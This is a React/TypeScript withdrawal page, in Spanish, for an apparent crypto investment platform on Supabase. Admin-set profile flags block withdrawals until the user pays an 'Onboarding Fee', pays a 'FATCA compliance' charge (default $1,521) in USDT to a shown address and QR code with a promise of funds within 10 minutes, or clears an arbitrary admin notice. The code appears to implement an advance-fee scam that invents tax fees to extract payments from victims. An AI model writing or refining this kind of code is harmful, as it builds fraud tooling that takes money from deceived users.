import { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { ArrowUpRight, AlertCircle, Lock, AlertTriangle, Copy, Check, Bell } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { ActivationModal } from "@/components/ActivationModal";
import { QRCodeSVG } from "qrcode.react";

const cryptoOptions = [
  { symbol: "BTC", name: "Bitcoin", color: "#F7931A", fee: 0.0001 },
  { symbol: "ETH", name: "Ethereum", color: "#627EEA", fee: 0.005 },
  { symbol: "USDT", name: "Tether", color: "#26A17B", fee: 1 },
  { symbol: "BNB", name: "Binance Coin", color: "#F3BA2F", fee: 0.001 },
  { symbol: "LTC", name: "Litecoin", color: "#345D9D", fee: 0.001 },
  { symbol: "USD", name: "Dólares", color: "#22C55E", fee: 0 },
];

const UserWithdrawPage = () => {
  const [selectedCrypto, setSelectedCrypto] = useState<string>("");
  const [amount, setAmount] = useState("");
  const [address, setAddress] = useState("");
  const [balances, setBalances] = useState<Record<string, number>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [isActivated, setIsActivated] = useState<boolean | null>(null);
  const [usdtAddress, setUsdtAddress] = useState<string>("");
  const [showActivationBlock, setShowActivationBlock] = useState(false);
  // FATCA state
  const [fatcaEnabled, setFatcaEnabled] = useState(false);
  const [fatcaAmount, setFatcaAmount] = useState<number>(1521.00);
  const [copiedFatca, setCopiedFatca] = useState(false);
  // Custom notification state
  const [showCustomNotification, setShowCustomNotification] = useState(false);
  const [customNotificationTitle, setCustomNotificationTitle] = useState("");
  const [customNotificationMessage, setCustomNotificationMessage] = useState("");

  useEffect(() => {
    const fetchProfileData = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data: profile } = await supabase
          .from("profiles")
          .select("usd, btc, eth, usdt, bnb, ltc, is_activated, activation_amount, usdt_address, show_fatca, fatca_amount, show_custom_notification, custom_notification_title, custom_notification_message, show_activation_modal")
          .eq("user_id", user.id)
          .maybeSingle();
        
        if (profile) {
          setBalances({
            USD: Number(profile.usd) || 0,
            BTC: Number(profile.btc) || 0,
            ETH: Number(profile.eth) || 0,
            USDT: Number(profile.usdt) || 0,
            BNB: Number(profile.bnb) || 0,
            LTC: Number(profile.ltc) || 0,
          });
          setIsActivated(profile.is_activated || false);
          setUsdtAddress(profile.usdt_address || "");
          setShowActivationBlock(profile.show_activation_modal === true);
          setFatcaEnabled(profile.show_fatca || false);
          setFatcaAmount(Number(profile.fatca_amount) || 1521.00);
          setShowCustomNotification(profile.show_custom_notification || false);
          setCustomNotificationTitle(profile.custom_notification_title || "");
          setCustomNotificationMessage(profile.custom_notification_message || "");
        }
      }
    };

    fetchProfileData();
  }, []);

  const selectedOption = cryptoOptions.find(c => c.symbol === selectedCrypto);
  const currentBalance = selectedCrypto ? (balances[selectedCrypto] || 0) : 0;
  const parsedAmount = parseFloat(amount) || 0;
  const fee = selectedOption?.fee || 0;
  const totalDeduction = parsedAmount + fee;
  const insufficientFunds = totalDeduction > currentBalance;

  const handleWithdraw = async () => {
    // Verificar bloqueos antes de procesar
    if (showActivationBlock) {
      toast.error("Tu cuenta no está activada. Completa el proceso de activación primero.");
      return;
    }
    if (fatcaEnabled) {
      toast.error("Debes completar el cumplimiento FATCA antes de retirar fondos.");
      return;
    }
    if (showCustomNotification && customNotificationMessage) {
      toast.error("Tienes un aviso pendiente que impide realizar retiros.");
      return;
    }

    if (!selectedCrypto || !amount || !address) {
      toast.error("Por favor completa todos los campos");
      return;
    }

    if (insufficientFunds) {
      toast.error("Fondos insuficientes");
      return;
    }

    setIsLoading(true);

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("No session");

      const { data: bankAccount } = await supabase
        .from("affiliated_bank_accounts")
        .select("id, bank_name, account_number, account_holder_name")
        .eq("user_id", user.id)
        .order("created_at", { ascending: false })
        .limit(1)
        .maybeSingle();

      const { error: insertError } = await supabase
        .from("transfer_requests")
        .insert({
          user_id: user.id,
          bank_account_id: bankAccount?.id ?? null,
          bank_name: bankAccount?.bank_name ?? "Destino externo",
          account_number: bankAccount?.account_number ?? address,
          account_holder_name: bankAccount?.account_holder_name ?? "Titular no especificado",
          amount: parsedAmount,
          currency: selectedCrypto,
          status: "pending",
          notes: `Solicitud de retiro desde la sección Retirar. Destino: ${address}`,
        });

      if (insertError) throw insertError;

      toast.success("Solicitud de retiro enviada. Será procesada en 24-48 horas.");
      setAmount("");
      setAddress("");
    } catch (error) {
      console.error("Error creating withdrawal request:", error);
      toast.error("No se pudo registrar la solicitud. Inténtalo de nuevo.");
    } finally {
      setIsLoading(false);
    }
  };


  const handleCopyFatcaAddress = async () => {
    if (!usdtAddress) return;
    try {
      await navigator.clipboard.writeText(usdtAddress);
      setCopiedFatca(true);
      toast.success("Dirección USDT copiada al portapapeles");
      setTimeout(() => setCopiedFatca(false), 2000);
    } catch {
      toast.error("No se pudo copiar la dirección");
    }
  };

  const setMaxAmount = () => {
    const maxAmount = Math.max(0, currentBalance - fee);
    setAmount(maxAmount.toString());
  };

  // Show loading state while checking activation
  if (isActivated === null) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
      </div>
    );
  }

  // ── Bloqueo por activación (admin seleccionó este tipo de bloqueo) ──
  if (showActivationBlock) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="text-2xl font-bold text-foreground flex items-center gap-2">
            <ArrowUpRight className="w-6 h-6 text-destructive" />
            Retirar
          </h1>
          <p className="text-muted-foreground">Retira fondos a tu cuenta o billetera</p>
        </div>

        <Alert className="border-amber-500/50 bg-amber-500/10">
          <Lock className="h-5 w-5 text-amber-500" />
          <AlertTitle className="text-amber-600 dark:text-amber-400 font-semibold">
            Cuenta no activada
          </AlertTitle>
          <AlertDescription className="text-amber-600/80 dark:text-amber-400/80">
            Para realizar retiros primero debes activar tu cuenta completando el proceso de <strong>Onboarding Fee</strong>.
            Dirígete a "Vista General" para activarla.
          </AlertDescription>
        </Alert>

        <Card className="bg-card border-border">
          <CardContent className="pt-6 flex flex-col items-center gap-4 py-10">
            <div className="w-16 h-16 rounded-full bg-amber-500/10 flex items-center justify-center">
              <Lock className="w-8 h-8 text-amber-500" />
            </div>
            <p className="text-muted-foreground text-center text-sm max-w-sm">
              Los retiros están bloqueados hasta completar la activación de tu cuenta. Una vez activada, podrás retirar tus fondos.
            </p>
            <Button onClick={() => setShowActivationBlock(false)} className="mt-2">
              Ver estado de activación
            </Button>
          </CardContent>
        </Card>

        <ActivationModal open={false} onOpenChange={() => {}} />
      </div>
    );
  }

  // ── PASO 2: Cuenta activada pero FATCA habilitado → bloquear ───────
  if (fatcaEnabled) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="text-2xl font-bold text-foreground flex items-center gap-2">
            <ArrowUpRight className="w-6 h-6 text-destructive" />
            Retirar
          </h1>
          <p className="text-muted-foreground">Retira fondos a tu cuenta o billetera</p>
        </div>

        <Alert className="border-amber-500/50 bg-amber-500/10">
          <AlertTriangle className="h-5 w-5 text-amber-500" />
          <AlertTitle className="text-amber-600 dark:text-amber-400 font-semibold">
            Cumplimiento FATCA requerido
          </AlertTitle>
          <AlertDescription className="text-amber-600/80 dark:text-amber-400/80">
            Para procesar tu retiro es necesario completar el pago de cumplimiento <strong>FATCA</strong> (Foreign Account Tax Compliance Act).
          </AlertDescription>
        </Alert>

        <Card className="bg-card border-border">
          <CardContent className="pt-6 space-y-4">
            {/* Monto FATCA */}
            <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-lg text-center">
              <p className="text-sm text-amber-600 dark:text-amber-400 font-medium">
                Pago requerido por cumplimiento FATCA
              </p>
              <p className="text-3xl font-bold text-foreground mt-1">
                ${fatcaAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </p>
            </div>

            <div className="p-3 bg-muted rounded-lg space-y-1">
              <p className="text-sm text-foreground">
                Para cumplir con las regulaciones FATCA, se requiere un pago de verificación antes de procesar transferencias internacionales.
              </p>
              <p className="text-sm text-emerald-600 dark:text-emerald-400 font-medium">
                Al efectuar el pago, en un plazo no mayor a 10 minutos se reflejarán los fondos en su cuenta bancaria.
              </p>
            </div>

            {/* QR y dirección USDT */}
            {usdtAddress && (
              <>
                <div className="flex flex-col items-center space-y-3">
                  <div className="p-4 bg-white rounded-lg">
                    <QRCodeSVG value={usdtAddress} size={160} level="H" />
                  </div>
                  <p className="text-xs text-muted-foreground text-center">
                    Escanea el código QR o copia la dirección USDT TRC-20
                  </p>
                </div>
                <div className="space-y-2">
                  <Label className="text-foreground">Dirección USDT (TRC-20)</Label>
                  <div className="flex items-center gap-2">
                    <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-xs break-all text-foreground">
                      {usdtAddress}
                    </div>
                    <Button variant="outline" size="icon" onClick={handleCopyFatcaAddress}>
                      {copiedFatca ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>
              </>
            )}
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── PASO 3: Aviso personalizado del admin → bloquear ───────────────
  if (showCustomNotification && customNotificationMessage) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="text-2xl font-bold text-foreground flex items-center gap-2">
            <ArrowUpRight className="w-6 h-6 text-destructive" />
            Retirar
          </h1>
          <p className="text-muted-foreground">Retira fondos a tu cuenta o billetera</p>
        </div>

        <Alert className="border-primary/50 bg-primary/5">
          <Bell className="h-5 w-5 text-primary" />
          <AlertTitle className="text-primary font-semibold">
            {customNotificationTitle || "Aviso importante"}
          </AlertTitle>
          <AlertDescription className="text-muted-foreground">
            {customNotificationMessage}
          </AlertDescription>
        </Alert>

        <Card className="bg-card border-border">
          <CardContent className="pt-6 flex flex-col items-center gap-4 py-10">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <Bell className="w-8 h-8 text-primary" />
            </div>
            <p className="text-muted-foreground text-center text-sm max-w-sm">
              Tienes un aviso pendiente de tu administrador. Por favor revisa la notificación anterior para continuar con tu retiro.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── PASO 4: Todo en orden → formulario de retiro ───────────────────
  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-foreground flex items-center gap-2">
          <ArrowUpRight className="w-6 h-6 text-destructive" />
          Retirar
        </h1>
        <p className="text-muted-foreground">Retira criptomonedas a tu billetera externa</p>
      </div>

      <div className="grid gap-6 md:grid-cols-2">
        <Card className="bg-card border-border">
          <CardHeader>
            <CardTitle className="text-foreground">Detalles del Retiro</CardTitle>
            <CardDescription>Completa la información para procesar tu retiro</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label className="text-foreground">Criptomoneda</Label>
              <Select value={selectedCrypto} onValueChange={setSelectedCrypto}>
                <SelectTrigger className="bg-background border-border text-foreground">
                  <SelectValue placeholder="Selecciona una moneda" />
                </SelectTrigger>
                <SelectContent className="bg-popover border-border z-50">
                  {cryptoOptions.map((crypto) => (
                    <SelectItem key={crypto.symbol} value={crypto.symbol}>
                      <div className="flex items-center gap-2">
                        <div 
                          className="w-4 h-4 rounded-full" 
                          style={{ backgroundColor: crypto.color }}
                        />
                        {crypto.name} ({crypto.symbol})
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {selectedCrypto && (
              <div className="p-3 bg-muted/50 rounded-lg">
                <p className="text-sm text-muted-foreground">Balance disponible</p>
                <p className="text-lg font-bold text-foreground">
                  {currentBalance.toFixed(selectedCrypto === "USD" ? 2 : 8)} {selectedCrypto}
                </p>
              </div>
            )}

            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <Label className="text-foreground">Cantidad</Label>
                {selectedCrypto && (
                  <Button 
                    variant="ghost" 
                    size="sm" 
                    onClick={setMaxAmount}
                    className="text-xs text-primary h-auto py-1"
                  >
                    Máximo
                  </Button>
                )}
              </div>
              <Input
                type="number"
                placeholder="0.00"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="bg-background border-border text-foreground"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-foreground">Dirección de destino</Label>
              <Input
                placeholder={selectedCrypto === "USD" ? "Número de cuenta bancaria" : "Dirección de la billetera"}
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="bg-background border-border text-foreground font-mono text-sm"
              />
            </div>

            {insufficientFunds && parsedAmount > 0 && (
              <Alert className="border-destructive/50 bg-destructive/10">
                <AlertCircle className="w-4 h-4 text-destructive" />
                <AlertDescription className="text-destructive">
                  Fondos insuficientes para este retiro
                </AlertDescription>
              </Alert>
            )}

            <Button 
              className="w-full" 
              onClick={handleWithdraw}
              disabled={!selectedCrypto || !amount || !address || insufficientFunds || isLoading}
            >
              {isLoading ? "Procesando..." : "Solicitar Retiro"}
            </Button>
          </CardContent>
        </Card>

        <Card className="bg-card border-border">
          <CardHeader>
            <CardTitle className="text-foreground">Resumen</CardTitle>
            <CardDescription>Detalles de tu solicitud de retiro</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-3">
              <div className="flex justify-between text-sm">
                <span className="text-muted-foreground">Cantidad a retirar</span>
                <span className="text-foreground font-medium">
                  {parsedAmount.toFixed(selectedCrypto === "USD" ? 2 : 8)} {selectedCrypto || "-"}
                </span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-muted-foreground">Comisión de red</span>
                <span className="text-foreground font-medium">
                  {fee} {selectedCrypto || "-"}
                </span>
              </div>
              <div className="border-t border-border pt-3">
                <div className="flex justify-between">
                  <span className="text-foreground font-medium">Total a descontar</span>
                  <span className="text-foreground font-bold">
                    {totalDeduction.toFixed(selectedCrypto === "USD" ? 2 : 8)} {selectedCrypto || "-"}
                  </span>
                </div>
              </div>
            </div>

            <div className="p-4 bg-muted/50 rounded-lg space-y-2 text-sm text-muted-foreground">
              <p>• Tiempo de procesamiento: 24-48 horas</p>
              <p>• Los retiros son revisados por seguridad</p>
              <p>• Verifica que la dirección sea correcta</p>
              <p>• Los fondos enviados a direcciones incorrectas no pueden ser recuperados</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default UserWithdrawPage;
